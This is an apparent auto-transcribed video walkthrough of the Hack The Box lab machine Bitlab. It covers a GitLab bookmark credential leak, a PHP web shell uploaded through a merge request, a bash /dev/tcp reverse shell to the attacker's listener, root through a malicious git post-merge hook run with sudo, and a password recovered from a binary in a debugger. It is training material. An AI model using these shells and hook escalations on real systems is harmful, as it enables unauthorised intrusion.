 what's going on YouTube this upset we're gonna be doing bit lab from hack the box a fun box then around get lab which is just an open-source version of github once you run go Buster against this box you discover a directory that has credentials to log into this service and upon logging in you'll see two different repositories one repository is the source code to a website that's on the root of the server and then the second is a post hook for get lab to push code from this repo into the web server so you upload a PHP reverse shell execute it to get shell on the box and then from here there's two different ways to prove esque the first one being a pseudo get pull after you edit a post hook and then the second one being a the first method is doing some magic with the get configs so you can create a post merge get hook that executes code after doing a git pull and then the second method is going into a Postgres database extracting credentials and then in that users home directory is a Windows executable you pull it and do some reverse engineering to find the root password hard code in it so with that being said let's jump into the box as always we'll begin with a and maps are - SC for default scripts as V enumerate versions Oh a output off format spin the nmap directory and call it fit lab and then the IP address which is ten ten ten one fourteen can take some time to run so i've already ran it looking at the results we have just two ports open the first one being ssh on port 22 and it's panda tells us it's a ubuntu box then we have HTTP on port 80 its banner tells us it's nginx we have a few nmap scripts running the first one being HTTP - robots telling us there's 55 disallowed entries but it's only showing us 15 and I don't like how it's outputting them like multiple per one line so I'm just gonna ignore and check robot X later then we have HTTP - title telling us to sign in to get lab and that is about it for the end map output so let's go take a look at what get web is so if we go to 10 10 10 1:14 we just get greed with that user sign-in page and the get lab login so the very first thing we want to check is robots.txt to just see what this is and you see all the entries there's nothing too interesting here so we won't really go into it the first thing I always do when looking at open source software is think there's a quick way to identify like configuration files that may be left on the server so I'm just going to search for get lab source Community Edition and we just go to the page and then try to figure out how it works and what files may be left on the server so if I try like license let's just search license in all caps see if this returns a page it redirects us back here so we can't really do anything the next thing I'm gonna do is view the source code and then let's just grab a random file and W get it so if we W get it then we'll be able to see the time stamp on the file so if we do exist tool against that we can see that file has a file modification of 2018 and December 29th so about two years ago this is when the file touched the server initially so it kind of gives us an idea if we do search boy that we should be looking for vulnerabilities sometime between late 2018 and the current time so a little bit handy trick there if you did use Firefox to save this it's probably going to stomp the file modification date so if we do exist tool on what we just downloaded HTTP we can see everything is 20/20 so highly recommend using W get and if you ever see all three of those being the same chances are something stumped on the date and you should check out a different tool will look into flags to see if we can preserve the file date so with that being said let's just draw in a go Buster so go Buster - you HTP 10 10 10 114 - w4 red list user share word list der buster directory list - 3 medium dot txt - OH we'll call it go Buster - root dot out and unknown flag because we express by the moon which is dir and we get the server returned a status code that matches the provided options for non existing URLs so go bus to try to go to this page this UID that shouldn't exist on the server and it returned a 302 message which is a status code that we think is a valid page so go Buster has no way to identify what is valid and what isn't and if we want to walk through that in burp we can we can just do turn burp suite on and go to 10 10 10 114 and we have to have intercept on of course and if we get a page like support me on patreon that doesn't exist and go to repeater and send it we get 302 found and says you are being redirected so let's remove that from a valid page so if we do - s4 status code copy this and then just remove 302 so now go Buster will treat 302s as like non-valid pages and it suddenly works almost immediately a few directors are popped up so let's go check out the very first one slash help so we can turn robust burp suite off and then just do a slash help and we get this index of slash help and there's a bookmarks HTML so I'm gonna get here and start looking through this the first link just goes to act the box then we have docker PHP nodejs and a get web login and then look at the bottom of the page you can see it's just JavaScript a bunch of JavaScript so what I'm going to do is right click here copy link location and we're just going to paste it into here so we'll call this bookmark j/s and paste you can also just Google like JavaScript codify or something and then paste some code in here and we'll make it a bit prettier but we can pretty much just do the same thing that did by getting rid of that javascript and then just doing % s semi colon backslash of a new line and then G so we put all those on a new line so this is really doing three things we're setting a variable and then running to JavaScript commands based upon that variable so the first thing I want to do is just copy this and see what all this translates to we could probably put this in Python or something and just translate hex to ASCII but I like to live dangerously and I just open up my web developer web console and paste this in and then we just type the variable name 0x for b18 and we can see the value it's an array and it's got six different values value use a login get element by ID clave user password and password so all this javascript is doing is if we edit this we can say the ver is let's see we copy can we copy this sweet we can so paste this in and we can get rid of this array and then we can just walk through this so if we delete this and say to was get element by ID and we can do the same thing here and then one is user login so we delete this whoops and put user login and for is user password zero is going to be value if I can type well okay and then three is clave and five is eleven Desio zero eight one x so what's doing is running these two JavaScript commands so this is like a ghetto password manager or autocomplete or something so it's just throwing the JavaScript get element by ID user login which is the user textbox and then setting that to clave so if we go back to the sign-in you can go into do developer tools by pressing f12 inspector click on this arrow click here and you can see that input ID is user login so that's how the Java scripts working so what they probably did was they had a bookmark bar so if we copy this link go to this page go to new bookmark we'll label this fit web login and paste the JavaScript as the wall again you can click it and it autocompletes so that's all that tab is doing if you want you can unmask the password to see exactly put in what we thought we just changed the type equals password to type equals nothing it'll unmask that field and you can see it so that lets us log in to get lab upon logging in go to the page we tried requesting demoing the 302 redirect which is support me on patreon which doesn't exist so now if we search for all license let's see does this exist we get a 404 but now it actually gives us four or four pages so if you wanted to you could take this cookie and I think go Buster supports a cookie option so we could have it log in and do the go bust so go Buster - H dir - H - D for the cookie string so if you wanted to we can get rid of this one take out that status code and do - C and then if we go into storage cookies get web session we can probably put this in get lab session equals I think is how you do cookies and paste the value let's see yep so now we still have 302 redirects here and go Buster is working so that's good not really gonna save us any time it may find some files that we wouldn't otherwise but just cool to demo how to do that and go Buster but now that we're logged in let's just take a look at the pages and I'm going to go to my settings and the settings looks weird go to this weird page that doesn't have anything so this doesn't look like it's part of go Buster that looks very broken if we go to like profile we can see a get lab profile and we see nothing here but remember the time stamp we had when we download that one CSS file that was like December 29th I think we do exist tool print yeah December 29th 2018 we see clave joined this get web server December 31st 2018 so it's kind of showing you that time stamp shows when someone was active on the box at least when doing CPS and in the real world it tells you when the box was really last touched so definitely handy to get ideas like we see a bunch of images on the box from a pre-image tragic type time frame I test out image tragic things like that just good recon to have looking at the snippets we can see one snippet here that's just saying PostgreSQL and then gives us a password which is profiles and the DB name is profiles but nmap did not reveal any Postgres instances but i'm still going to do and map - p - because i forgot to do it so 10 10 10 114 - Oh a for all ports and put that in and map bit lab - all ports and then - V so we see Oh ports as we find them so if we do find Postgres open then we can start trying to log into it that's just another database like my sequel take a look at the source let's see where's commit log license I don't see history that's why I want the first thing I always look at is history here and we can see what they're doing I may try downloading the get files and doing like a get leak against this but we did that in a previous box I think it was craft so instead of doing that let's just take a look at what these pages do so I'm in the deployer script if we look at index dot PHP and we go to the profile script and we can take a look at what these files are this one is saying input file get contents PHP input payload JSON to code and then setting repo name then state branch if repo equals profile branch equals master event equals merge request and state merged then go up one directory then go into profile so we're probably in this deployer directory go CD dot dot so then when root and then run sudo get pull one root and then go into profile so root profile and then run git pull with sudo so this is telling us that the web user dub-dub-dub data probably is in the sudoers file and can run git commands and get has a bunch of like post hook commands that allow you to do things when you do polls merge clones whatnot so that's definitely giving us a lot of information we look here we just see this is the regular profile and if we look at this history now you do see a bunch of merge request so merge test deploy into master so this looks like maybe when we merge a branch here it will automatically push so let's try this theory what I'm going to do is go back and let's create a new branch because it shouldn't matter we could go into the test deploy branch but let's create a new one if this page loads wow this is low okay so let's see download that's not what we want let's do new new branch and we can call this Blanche please subscribe we'll create it and then one is created we can drop a file and then ask for emerge and if it gets merged into the root we may get that file so let's go plus new file and what we can call this is shell PHP and we'll just do a simple PHP SEP shell system request and we'll call this please it subscribe like that okay and before I do system I'm also gonna do echo test or step test support me on patreon because there is a chance something like PHP Safe Mode or something is on and just doesn't let this system command run so before I do the system command I want to do something I know it should work which is an echo statement because I can't think of any scenario where echo will be a blacklisted command in PHP so that's why I put that echo first then we commit this and we can create a merge request and just hope I don't have a syntax error in that PHP so add new file for submit merge request and its target branch is master so we're looking at that it is creating the merge we select merge and now if we go to /root slash profile we should see shell PHP we do so on the server we have that slash profile directory so if I execute shell PHP there we go it exists so I press ctrl R to refresh the page and we have it echoing please support me on patreon and then the system command is failing so we could always do question mark please subscribe equals Who am I and we get the data please support me on patreon and then alper to the command dub dub dub - data so what I'm going to do is turn foxy proxy back to burp suite control R to intercept the request and then control her to Center repeater control shift our I'm going to change this post get request to a post request because post request has last West bad characters I'm just going to bash - C fast - I and then dev TCP 10 1014 - which is my IP address and this is just a simple one-liner so we can highlight this whole thing press ctrl you to gyro encoder go to a thing down here and let's just do netcat LLVM P 9001 for NC l lv n P 9001 click send we don't get a response back because we can see the shell was here so Python - C input PT y PT y dot spawn then - and then ctrl Z - background s TTY raw - echo and enter twice and then F G so stty draw - echo hit enter once I know I said twice type FG to foreground it and then hit enter twice to get a proper shell so we can do s TTY - a s TTY a 34 136 so I want to update my rows and columns so s TTY rows 34 and columns will be 136 so stty - a again that is sent and that will allow me to do things like run them so if I do them now it's a works if I did before them would like be in this top corner right there and very ugly the last thing I want to do is export term equals to X term so I have ctrl L to clear the screen and we can double check we can sudo with sudo - L and we can see we can run get pull so the first thing I'm going to do is do man get hooks and this will explain what get hooks are and I can search for it pull and we see post-merge this hook is involved invoked by get merge which happens when a get pull is done on a local repository so we just have to edit the hook post merge and then run this sudo command to run a command as root so let's go to LS l a there is a dot get directory so let's go here LS l a we want to go into hooks and then we want to create was it what is it called man get hooks I think Paris merge yep first emerge so if we touch post-merge we can't because everything is owned by root and we don't have write access however if we copy this to a directory where we do have write access so if we make sh m please subscribe and then copy the profile directory so CP - Earth profile - please subscribe we've now essentially mirrored that directory but because CP can't preserve the file ownership it created all those files in that directory as us so if we go into that directory and profile get and do it OS - la we will see that dub dub dub - data owns all the files and then if we go into the hooks directory we can see we are in these files - where I'm like before those were owned by root so we can touch post - merge and then make it executable so well when we do the get pull the get command can execute it so we just do touch post merge and then drop a shell in it with VI so we'll do post merge and then then - bash - see bash - I like that deb tcp 1010 14 - what 9001 and that should be it so save that so we do sudo get pull well I probably NCL VMP 9001 the repositories up to date and even though we copied this whole get file out of it if we update the profile it will still pull it from this web server so turn this off let's just go and touch something so it's just add a file we touch it's a can we just call this just to create a commit and we could probably do like get help permission Oh LSL a user bin get I was gonna say we could potentially roll back to a previous commit then pull it but get is only runnable by the root user so the only reason we can run get is because we're doing that get pull so we added a new file let's save this and while that goes we can go over what's happening so if we go into the dot git config file we can see where it actually pulls from so it's doing an SSH get at localhost port 30:22 / root slash profile get so this is where it's pulling it from so even though we copied this whole directory out of verb dub dub and copied it here the config is still pulling it from the same place so that's why this works so if I do sudo get pull we've updated on the server so it has a new Kiba request to pull and we can get root on the box so if we go CD home we can do WCC root text and 33 characters which is a md5 something the line break but this was actually a unintended route you're not supposed to do the box this way this is just the way I had done the box because looking at that pseudo get is what put me down this path because I know with git there's a bunch of the hooks that you can run to always get code execution so very dangerous thing to give sudo access to that being said let's go do this box the intended way so let's go back to the web page and I think was on ER snippets so we go to a user profile and then snippets we can see this Postgres SQL step and I think if we go to the project there's a hint to use this C to do connect with Postgres SQL and then the source is this this interesting no so this is the hit the to do to connect with first-class SQL and the snippet being here so if we copy this code and go to dev sh m and we can just create test dot PHP and then set mode to paste paste the code in and then we just make this actually return data so it's going to clean it up a little bit by putting things on new lines we can see currently the script runs select star from profiles and outputs it into this result variable if we just try to echo result it's not going to do what we expect so if we just do PHP test dot PHP result is resource ID number five so we have to look into kind of how to use Postgres with PHP and the best thing to do really is just Google examples so PG query PHP example select and we can see things here like let's see PG query and it's not shown here but there is a PG fetch all its always showing PG fetch Association which maybe it'll do let's try that real quick so we can run results is equal to PG fetch Association and then result simply echo results what's it gonna say array string conversion so we can try print oh and this will print the array and we actually do get it so when I do the box I didn't use fetch Association I did fetch all but probably just the different pages I went to when I did it because I don't know first grass but both those commands did the same thing and you get user name clave password as that so we can do echo dash n paste that in base64 dash D and we get some invalid input so I'm gonna get rid of this dash n maybe it actually wants the new line break and we still get invalid input so let's try some padding I'm just trying to make sure this doesn't say invalid input and if we any padding in we don't get it so let's try doing su - clave and you can also use SSH and try to get in and we don't get in so maybe at this point I was thinking I have to put like an exclamation point at the end maybe it was missing the final character because we were getting a decoding error when trying to do this so that was my thought process adding character removing it and the actual answer is something really silly the password is actually the base64 so I have the base64 and my clipboard su - clave paste it in and we get to his user so I really didn't like that step of the box I'm guessing maybe it was a mistake and the person had the base64 in the clipboard when it should have been the base64 decoded output either way little bit silly but the get hook method to route the box is still pretty awesome so there is this remote user remote connection exe and the users directory so let's go download this so I'm just gonna do SCP clave at ten ten ten one-one for remote connection Exe and put it to my current working directory one Aspen the password just paste in that base64 which again is that don't decode it and we get the remote connection file so we can do strings remote connection kind of look at them to see what they are we can see a shell execute so this is probably calling window shall execute somewhere access denied get user name some things we can try change the encoding of strings to like l to see what that is if you do man strings on - e you can see the things of encoding - l I forget what L is I think little endian dashi let's see s is single seven bit by character ASCII l yeah 32 bit lower case L is 16 bit little endian uppercase L is 32 but I always remember SL and B be as big endian L is little endian and s is ASCII so those are the ones I always do it with so L we get clave putty and open capital L we don't get anything B boolean same thing a big-endian s is that capital s a little bit more data but we don't really get anything the main thing I was looking for is like a password and we didn't really get anything we got the username clave but we never got a password we do see the full alphabet here and then this and generally when I see this I'm thinking like base64 so let's grab this output because this is the standard base64 character set so let's grab this string and do echo - and paste it in K 64 - D we just get a bunch of weird junk so we get this character and then all of this so I'm gonna try the strings command with lowercase s to see if that's the same thing I'm going to search for ABC copy it because maybe a grab an extra character or something in that encoding so paste that let's do comet echo and echo - n paste paste 64 - D echo we still get the same exact thing so we could try like SSA Qing with this password 10 10 10 1 1 4 and we don't get in so that's definitely not it it's kind of bit odd how this is so there's probably some type of obfuscation going around this string so let's open this up in deidre and see what we can find so just launching dedra and then we will do a new project and open up remote connection so clicking on code browser and then pressing I to import click on remote connection Exe ok and now it will ask us to analyze the file and what does they say yes analyze and click ok so we can take a look at the functions to see if it's a strict binary if it is we won't have the names of everything if it isn't then we do have the names and looks like it is going to be stripped unfortunately which makes it slightly more difficult to analyze but not impossible so we can search the binary for Strings minimum length 5 alignment 1 that's fine if we just click search now we can see everything so what I'm going to do is check out how this base64 string is utilized by right-clicking on it references references to this address and we go here so I'm going to search around this address to see if right before it it's loading that base64 string it is not can I rename this folder and I'm going to label this right now we're be 64 is and that did not label what I thought it would but okay what does a member of 402 is where that base64 string is so let's go back into the search strings and I want to see where this is called if this is in 402 as well so reference to this address go here let's see it's nine one seven well we're there cores out so a little bit of different place we can click on the graphing tool to try to figure out where we are and it's not showing us the call graph so at this point I'm not exactly sure what to do so let's go strings again and check out what's happening around the base64 and this time we'll just go into the decompiled output and see if the code makes sense which probably does not so let's highlight where this is and go in the decompiler it's not even saying highlight in the field I think it's this let's see four zero one eight search well we can by just double click this and go here that's not it so check this one out so at this point I really have no idea of what's going on the binary hoping up engagement didn't help all that much you could search for strings like the open call of putty and then searching this to see what the code looks like a round mess if we highlight putty should highlight on the decompiler I'll add a block of code there we go so we know it does call putty with some parameters so at this point I just want to see what these parameters are and that means I should start debugging it so let's go over to Windows and run this program when it comes to Windows things I generally use the command ovm put out by mandiant I'm just opening up Firefox so I can show you what tool I'm using or where to download it but if you have command of vm you can just go to tools debuggers and then open up I think x32 debug because I think this is a 32-bit application man this VM is going slow ok not now x64 DBG just search for this go here and download this application so this is what I'm using it is a new look like a lot of people still use like Ali or immunity but I like X 64 X 32 debug because they're still under development I think both Ali and immunity are not under development so got a file open go to a desktop selector application and let's make this font a little bit bigger for you guys so if I go to options appearance font and change everything to 14 maybe this one probably should not be hex Tom sure see what this looks like and maybe twelve that should be fine so the first thing I always do is click run to user code and this is going to get to like the entry point of the program and here's where we're calling a remote connection and the entry point so I'm going to click this string here define strings and we'll get to essentially the same thing we did in dija double click here we can find reference to address and then just press f2 to insert a breakpoint so we're gonna do that to a few things so definitely want that one string whenever it calls putty all I want to know that what's another one probably access denied and for access denied I'm going to set a bunch of breakpoints because I want to make sure I get here so if the application enters here I want to know the application enters here I want to know so let's go with all that and then just click run the first breakpoint is hit on this weird base 64 at 0 X 13 C 1 5 we could step a few times to see what this is doing but it's not overly obvious to me so I'm just going to actually I'm gonna hold f7 real quick so we can just go and see if I see anything unique happening eb @ so this may be doing the base64 decode because we have the base64 string here and then what it's going so we can just click forward and we get here to where the access deny message is and right here on the stack we can see a password qf7 something so let's copy this select line go to notepad paste this in and I think we just won right here so make sure eyes on my clipboard but I do want to show you what you can do here so what the program right here I'm going to right click it find reference to address and that didn't work so I'm gonna set a breakpoint here let's restart the program and we're gonna see if the program enters on this address it did not so I'm gonna set a few more breakpoints and I want to get to the point where my e IP is set to the very first breakpoint so if I enter here then I know the breakpoints above it did not hit so this is where the call is or the jump so let's try this again go go this is the base 64 so right here because I'm entering right here I know there's something that put me at this address because otherwise my breakpoints were to hit on these above ones so now if I right-click find reference to selected address we can see what put us here so this ji e and we can find reference to address that did not work this JL so we could set breakpoints on both of those and then when we run the program again Jael you could just let's see if we step into so we did not take that jump right here we see it's highlighted red which means we do take the jump and x32 x64 debugs nice enough to tell you the je flag is jump and probably if Z F is equal to zero so you could either change this by editing the opcode so we can go binary edit and instead of 74 27 which is je I think 75 27 is J and E and that's job jump not equal to one so you can change that you can see this is no longer red and if you go down we no longer took that jump but we'll still go here and hit access denied so the other thing you could have done is instead of editing the opcode whoops you could double click here and change the register so je will jump if ZF is not equal to zero so we set it to zero and then we can keep going through so two ways to go through but turns out we don't really have to do this much debugging because we got oh oh I just ended the program again yeah the command box popping up thought something else happened but now but we don't have to spend that much time debugging it because when we're doing all of this and stepping through it password just magically appeared on the stack and if you wanted to find out exactly why then what I would probably do is keep doing the find reference to addresses and nothing's there so go above it and figure out exactly when this gets pushed to the stack and then look at that code but that would be for another day because I got this password so let's try copying this over to a Cali box and seeing if it works so I'm back on Cali and the password is in my clipboard so we can SSH 1010 for 10.1 41 or 142 let's see cat and Matt fit lab dot and map 10 10 10 114 as the IP hopefully I said that correctly in the beginning of the video let's try restoring my VPN paying 10 10 10 114 I can ping it SSH there we go paste it in and we our route so this is the second way on the box if we echo this again and let's copy well echo - n the password WCC we probably should put this in quotes because it has some weird special characters 24 we copy this at code - n WC - see it is 25 so maybe the password ends at this : but if I am correct and this is indeed a piece of the password then it's a good part of the box but maybe one day I'll do the hacked box challenges which go more into reversing it's one of my weak points and I didn't actually reverse to free out exactly how to manually decrypt the password I just did it from driving off the stack so I hope you guys enjoyed the video take care and I will see you all next week